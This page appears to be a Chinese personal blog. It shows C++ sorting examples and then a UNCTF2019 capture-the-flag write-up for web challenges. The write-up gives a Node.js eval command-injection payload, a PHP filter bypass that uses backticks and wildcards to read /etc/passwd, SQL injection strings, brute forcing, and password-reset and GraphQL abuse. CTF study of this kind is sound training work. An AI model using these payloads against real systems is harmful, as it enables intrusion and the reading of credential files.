class="comment">//找到比哨兵(当前位置元素)小的元素,把哨兵的位置让给它</span></span><br><span class="line">                                         <span class="comment">//找到的这个元素是数组中最小的元素</span></span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//a[i]与哨兵(最小的元素)交换位置</span></span><br><span class="line">      temp = a[i];<span class="comment">//a[i]为当前位置的元素,temp为暂存空间</span></span><br><span class="line">      a[i] = a[minindex];</span><br><span class="line">      a[minindex] = temp;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="2-3-2-链表实现"><a href="#2-3-2-链表实现" class="headerlink" title="2.3.2 链表实现"></a>2.3.2 链表实现</h3><p>待补充……</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;typeinfo&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END_CODE -999 <span class="comment">//链表结点'数据录入'结束标志！</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(0)元素(结点)类型 */</span></span><br><span class="line"><span class="comment">/*(0.1)单一元素 */</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="keyword">int</span>  ElemType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*(0.2)混合元素 -&gt; 通过结构体进行定义 */</span></span><br><span class="line"><span class="comment">//typedef struct &#123; //此部分：根据实际问题进行定义...</span></span><br><span class="line"><span class="comment">//	float  coef;   /*系数部分*/</span></span><br><span class="line"><span class="comment">//	int    expn;   /*指数部分*/</span></span><br><span class="line"><span class="comment">//&#125; ElemType;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(1)单链表结点 定义*/</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span>  <span class="title">lnode</span> &#123;</span></span><br><span class="line">	ElemType  data;     <span class="comment">//数据域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>  <span class="title">lnode</span>  *<span class="title">next</span>;</span>      <span class="comment">//指针域</span></span><br><span class="line">&#125; LNode,*LinkList; <span class="comment">/*结点的类型 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(LNode *L)</span></span>; <span class="comment">//函数声明</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(2.1)【头插入法】创建单链表,链表的头结点head作为返回值 */</span></span><br><span class="line"><span class="function">LNode *<span class="title">create_LinkList_H</span><span class="params">( )</span> </span>&#123;</span><br><span class="line">	LNode *head, *q; <span class="comment">//head-头结点; q-待插入结点指针</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//(A)创建只有头结点head的: '空单链表'</span></span><br><span class="line">	head = <span class="keyword">new</span> LNode; <span class="comment">//head = (LNode *) malloc( sizeof(LNode) );</span></span><br><span class="line">	head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(B)录入链表各结点的数据, 并钩链</span></span><br><span class="line">	ElemType data;  <span class="comment">//线性表 结点的数据域</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"input data : "</span>&lt;&lt;END_CODE&lt;&lt;<span class="string">" to stop!\n"</span>;</span><br><span class="line">	<span class="keyword">while</span>( <span class="literal">true</span> ) &#123; <span class="comment">//无限循环, 只到停止输入...</span></span><br><span class="line">		<span class="comment">//(a)键盘输入一个链表结点数据--&gt;data</span></span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; data; <span class="comment">//scanf("%d", &amp;data);</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//(b)若录入数据data == '数据录入'结束标志END_CODE,则完成链表创建！</span></span><br><span class="line">		<span class="keyword">if</span>( data == END_CODE ) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//(c)录入的链表结点数据'data'有效, 则创建一个链表结点存储此数据</span></span><br><span class="line">		q = <span class="keyword">new</span> LNode; <span class="comment">//q = (LNode *)malloc(sizeof(LNode)); //新建'链表结点'</span></span><br><span class="line">		q-&gt;data = data;	<span class="comment">//数据域赋值</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//(d)钩链: 新创建的结点q总是作为第一个结点</span></span><br><span class="line">		q-&gt;next = head-&gt;next;</span><br><span class="line">		head-&gt;next = q;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//(e)信息提示: 结点创建成功! 并显示当前链表的内容信息！！！</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Node"</span> &lt;&lt; q-&gt;data &lt;&lt; <span class="string">"create successfully!\n"</span>;</span><br><span class="line">		<span class="comment">//show(head); //显示当前的链表</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(C)返回此单链表的'头结点head'</span></span><br><span class="line">	<span class="keyword">return</span> (head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SelectSort</span><span class="params">(LinkList &amp;L)</span><span class="comment">//简单选择排序</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   LinkList p = L-&gt;next;</span><br><span class="line">   LinkList minindex;<span class="comment">//设置一个节点minindex</span></span><br><span class="line">   LinkList q;</span><br><span class="line">   <span class="keyword">int</span> temp;</span><br><span class="line">   <span class="keyword">while</span>(p)<span class="comment">//从第一个节点开始遍历</span></span><br><span class="line">   &#123;</span><br><span class="line">     q=p-&gt;next;<span class="comment">//第一个节点往右的节点</span></span><br><span class="line">     minindex=p;<span class="comment">//设置当前ｐ指针为最小，为这一趟选择排序开始的位置</span></span><br><span class="line">     <span class="keyword">while</span>(q)<span class="comment">//</span></span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">if</span>(q-&gt;data&lt;minindex-&gt;data) minindex=q;<span class="comment">//在本趟中寻找最小的那个数</span></span><br><span class="line"></span><br><span class="line">       q=q-&gt;next;</span><br><span class="line">       <span class="keyword">if</span>(minindex!=p)<span class="comment">//判断最小的数是否为当前的节点ｐ</span></span><br><span class="line">       &#123;</span><br><span class="line">         temp = minindex-&gt;data;</span><br><span class="line">         minindex-&gt;data = p-&gt;data;</span><br><span class="line">         p-&gt;data = temp;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     p=p-&gt;next;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(LNode *L)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//(A)单链表为NULL空</span></span><br><span class="line">	<span class="keyword">if</span>(L-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"linklist: empty!!!\n"</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(B)输出以L为头结点的单链表的各个结点的数据格式:"顺序表:--&gt;e1-&gt;e2-&gt;...-&gt;en"</span></span><br><span class="line">	LNode *q = L-&gt;next; <span class="comment">//q指向L的下一结点</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"number: "</span>;</span><br><span class="line">	<span class="keyword">while</span>(q != <span class="literal">NULL</span>) &#123; <span class="comment">//循环,以输出各结点的数据</span></span><br><span class="line">		<span class="comment">//(a)输出结点数据</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; q-&gt;data;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//(b)下一个结点</span></span><br><span class="line">		q = q-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//链表输出结束-换行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LNode *head = create_LinkList_H();</span><br><span class="line">    show(head);</span><br><span class="line">    SelectSort(head);</span><br><span class="line">    show(head);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-4-快速排序"><a href="#2-4-快速排序" class="headerlink" title="2.4 快速排序"></a>2.4 快速排序</h2><h3 id="2-4-1-数组实现"><a href="#2-4-1-数组实现" class="headerlink" title="2.4.1 数组实现"></a>2.4.1 数组实现</h3><p>原理参考:<a href="https://www.cnblogs.com/CBDoctor/articles/4077574.html" target="_blank" rel="noopener">快速排序原理</a></p>
<p>代码参考如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j,t,temp;</span><br><span class="line">  <span class="keyword">if</span>(left&gt;=right) <span class="comment">//作为后面递归结束的判断依据</span></span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">  temp=a[left];<span class="comment">//temp为基准数,该</span></span><br><span class="line">  i=left;<span class="comment">//i相当于左边的哨兵</span></span><br><span class="line">  j=right;<span class="comment">//j相当于右边的哨兵</span></span><br><span class="line">  <span class="keyword">while</span>(i!=j)</span><br><span class="line">  &#123;</span><br><span class="line">     <span class="comment">//从右往左开始寻找比temp小的数,直至找到为止</span></span><br><span class="line">     <span class="keyword">while</span>(a[j]&gt;=temp&amp;&amp;i&lt;j) j--;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//从左往右开始寻找比temp大的数,直至找到为止</span></span><br><span class="line">     <span class="keyword">while</span>(a[i]&lt;=temp&amp;&amp;i&lt;j) i++;</span><br><span class="line">     <span class="keyword">if</span>(i&lt;j)<span class="comment">//交换位置</span></span><br><span class="line">     &#123;</span><br><span class="line">       t=a[i];</span><br><span class="line">       a[i]=a[j];</span><br><span class="line">       a[j]=t;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a[left]=a[i];<span class="comment">//基准数归位</span></span><br><span class="line">  a[i]=temp;</span><br><span class="line">  quickSort(a,left,i<span class="number">-1</span>);</span><br><span class="line">  quickSort(a,i+<span class="number">1</span>,right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[] = &#123; <span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> n=<span class="number">10</span>;</span><br><span class="line">	quickSort(a,<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/19/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/" data-id="ck8sqr5kd001lkou575fj92zv" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-welcome-to-小渣渣的博客" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/15/welcome-to-%E5%B0%8F%E6%B8%A3%E6%B8%A3%E7%9A%84%E5%8D%9A%E5%AE%A2/" class="article-date">
  <time datetime="2019-11-15T01:49:51.000Z" itemprop="datePublished">2019-11-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/15/welcome-to-%E5%B0%8F%E6%B8%A3%E6%B8%A3%E7%9A%84%E5%8D%9A%E5%AE%A2/">welcome to my blog..</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>welcome to my blog……</p>
<p>my old blog is : <a href="cookiegiao.github.io">cookiegiao</a>,But it’s broken now.</p>
<p>my QQ is : 1598195071…..emmmm,nice to meet you…..</p>
<p>Today is a  solider….</p>
<p>愿你对一切都充满着好奇心和热情……</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/15/welcome-to-%E5%B0%8F%E6%B8%A3%E6%B8%A3%E7%9A%84%E5%8D%9A%E5%AE%A2/" data-id="ck8sqr5kb001hkou530hk7o2y" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/someting/" rel="tag">someting</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-UNCTF2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/11/UNCTF2019/" class="article-date">
  <time datetime="2019-11-11T04:11:48.000Z" itemprop="datePublished">2019-11-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/11/UNCTF2019/">UNCTF2019</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>UNCTF2019…………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………….</p>
<h1 id="题解-web"><a href="#题解-web" class="headerlink" title="题解 [web]"></a>题解 [web]</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>查看源码，发现源码中的<strong>/calc</strong></p>
<p><img src="/.com//4.png" alt></p>
<p>尝试一下，这实际是一个计算器，后台逻辑估计是会将字符串输入到后台并执行。比如执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc <span class="number">1</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>后台回显 2，所以这里存在命令执行漏洞。</p>
<p>参考文章：<a href="http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#%E5%8F%82%E8%80%83" target="_blank" rel="noopener">Node.js代码审计之eval远程命令执行漏洞</a></p>
<p>​                   <a href="http://nodejs.cn/api/child_process.html#child_process_child_process_execsync_command_options" target="_blank" rel="noopener">child_process.execSync(command[, options])</a></p>
<p>我们调用子进程进行命令执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;calc require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString()</span><br></pre></td></tr></table></figure>

<p>空格被过滤，使用${IFS}绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc <span class="keyword">require</span>(<span class="string">'child_process'</span>).execSync(<span class="string">'cat$&#123;IFS&#125;/flag'</span>).toString()</span><br></pre></td></tr></table></figure>

<p><img src="/.com//5.png" alt></p>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">    $b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"> <span class="comment">// try bypass it</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))</span><br><span class="line">        $a = <span class="string">""</span>;</span><br><span class="line">        $a =<span class="string">'"'</span> . $a . <span class="string">'"'</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $b))</span><br><span class="line">        $b = <span class="string">""</span>;</span><br><span class="line">        $b = <span class="string">'"'</span> . $b . <span class="string">'"'</span>;</span><br><span class="line">     $cmd = <span class="string">"file $a $b"</span>;</span><br><span class="line">      str_replace(<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"$cmd"</span>); </span><br><span class="line">     system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的反引号<strong>‘ ` ‘</strong>没有被过滤掉。</p>
<p><img src="/.com//1.png" alt></p>
<p>遍历目录</p>
<p><img src="/.com//2.png" alt></p>
<p>使用linux中的通配符还有/bin目录下文件的作用，我们可以使用被过滤掉的命令，如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php &gt; system(<span class="string">"file `/b?n/?at /etc/passwd`"</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt></p>
<p>由于找不到flag文件的位置，所以使用如下命令获得flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//101.71.29.5:10054/?a=`/b?n/gre?%20-R%20ctf`</span></span><br></pre></td></tr></table></figure>



<p>flag:unctf{86dfe85d7c5842c5c04adae104193ee1}</p>
<h2 id="easy-admin"><a href="#easy-admin" class="headerlink" title="easy_admin"></a>easy_admin</h2><p>（1）发现找回密码处存在sql注入</p>
<p>然后过滤了select ，还有一些关键词，然后我们可以通过盲猜的方式获得密码</p>
<p>payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">' &amp;&amp; substr(password,1,1)='</span>f<span class="string">'#</span></span><br></pre></td></tr></table></figure>

<p>因为密码估计也比较短，用burpsuit爆破一下就好了，获得用户名密码：flag{never_too</p>
<p>登录后，抓包在数据包中插入<strong>referer: 127.0.0.1</strong>获得后半段flag</p>
<p><img src="/.com//24.png" alt></p>
<p>最终flag为：flag{never_too_late_to_x}</p>
<h2 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h2><p>这题，密码是随机的，直接使用一个大字典爆破，就好。狗屎运，一爆就出来了，拿了一个一血。。。。。</p>
<p><img src="/.com//6.png" alt></p>
<h2 id="reset-passwd"><a href="#reset-passwd" class="headerlink" title="reset passwd"></a>reset passwd</h2><p>不放图了，一个逻辑漏洞，后台估计是通过session来判定是否接收到验证码</p>
<p>（1）注册一个用户，使用真实的邮箱</p>
<p>（2）找回密码，填写用户名，邮箱接收到验证码后，填写验证码，跳转至修改密码页面</p>
<p>（3）不要急着修改密码，在这个页面下点击登录，到登录页面后，再点找回密码，到需要填写用户名的页面</p>
<p>（4）填写用户名为admin，这时候要我们输入验证码，这时候再后退，后退到我们之前自己注册的账号，填写新密码的页面</p>
<p>（5）修改密码，登录，getflag……… </p>
<p><img src="/.com//22.png" alt></p>
<h2 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h2><p>参考文章：<a href="https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0" target="_blank" rel="noopener">https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0</a></p>
<p><img src="/.com//7.png" alt></p>
<h2 id="加密的备忘录"><a href="#加密的备忘录" class="headerlink" title="加密的备忘录"></a>加密的备忘录</h2><p>跟简单的备忘录一样，<strong>/graphql</strong>提供了graphql查询，只不过没有写界面，需要自己构造查询数据包</p>
<p>用get-graphql-schema工具列出结构后，发现<strong>Query</strong>类中多了一个<strong>checkPass</strong>函数，<strong>Memo_</strong>类中多了一个<strong>password</strong>属性</p>
<p>跟上一题一样的payload查询，得到password：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u8981\u6709\u4e86\u4ea7\u4e8e\u4e86\u4e3b\u65b9\u4ee5\u5b9a\u4eba\u65b9\u4e8e\u6709\u6210\u4ee5\u4ed6\u7684\u7231\u7231</span><br></pre></td></tr></table></figure>

<p>unicode解码后是一串中文</p>
<p>再用checkPass函数，传入password:1，发现返回的是”\u4e3a\u6211\u7231\u7231” not valid password</p>
<p><strong>\u4e3a\u6211\u7231\u7231</strong>拿去unicode解码又是一串中文</p>
<p>因此猜测后台对password进行了unicode变种编码，然后<strong>checkPass</strong>函数提供给我们加密结果的功能</p>
<p>所以思路就是利用<strong>checkPass</strong>来还原密文</p>
<p>通过测试，发现可以对密文逐位的爆破，思路：</p>
<p>（1）首先爆破第一位，checkPass函数传入的参数password：[0-9a-zA-Z]，看看哪个返回的结果中带有密文password的第一个unicode编码：<strong>\u8981</strong>，结果发现[H-K]都满足</p>
<p>（2）将第一位设置[H-K]，第二位继续设置[0-9a-zA-Z]，看看哪个返回结果中带有密文前两个unicode编码：<strong>\u8981\u6709</strong>，发现当第一位为<strong>H</strong>，第二位为<strong>[a-o]</strong>时，都满足，由此确定第一位明文为<strong>H</strong></p>
<p>（3）将第二位设置为[a-o]，第三位设置为[0-9a-zA-Z]，由此类推</p>
<p>最后手动爆破出password：<strong>HappY4Gr4phQL</strong></p>
<p>另外还有个content字段，比较长，猜测是flag，同样方法，最后还原出flag明文：flag{a98b35476ffdc3c3f84c4f0fa648e021}</p>
<h2 id="Twice-insert"><a href="#Twice-insert" class="headerlink" title="Twice_insert"></a>Twice_insert</h2><p>二次注入，然后源码就是sqlilab24关，几乎没有改动，username 来自于session，直接拼接没有过滤。不一样的地方就是，二次注入修改了admin的密码后，不能获得flag。但是在修改密码的地方存在漏洞。而且没有限制username的长度，这就意味着我们可以通过盲注来爆库。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   $username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">$curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">$pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($pass==$re_pass)</span><br><span class="line">&#123;	</span><br><span class="line">	$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br><span class="line">	$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">	$row = mysql_affected_rows();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">	<span class="keyword">if</span>($row==<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password successfully updated"</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>然后盲注有个问题在于information被waf掉了，导致我一直无法注出后续的东西。</p>
